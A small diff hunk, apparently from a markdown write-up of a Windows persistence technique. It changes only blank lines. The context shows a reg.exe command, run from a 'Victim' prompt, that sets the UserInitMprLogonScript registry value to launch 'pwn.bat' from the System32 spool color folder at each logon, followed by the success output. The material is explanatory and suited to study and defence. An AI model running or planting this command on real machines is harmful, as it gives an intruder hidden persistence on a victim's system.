@@ -25,3 +25,5 @@ reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "$_FULL
 PS C:\Users\Victim > reg.exe add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "C:\Windows\System32\spool\drivers\color\pwn.bat" /t REG_SZ /f
 The operation completed successfully.
 ```
+
+
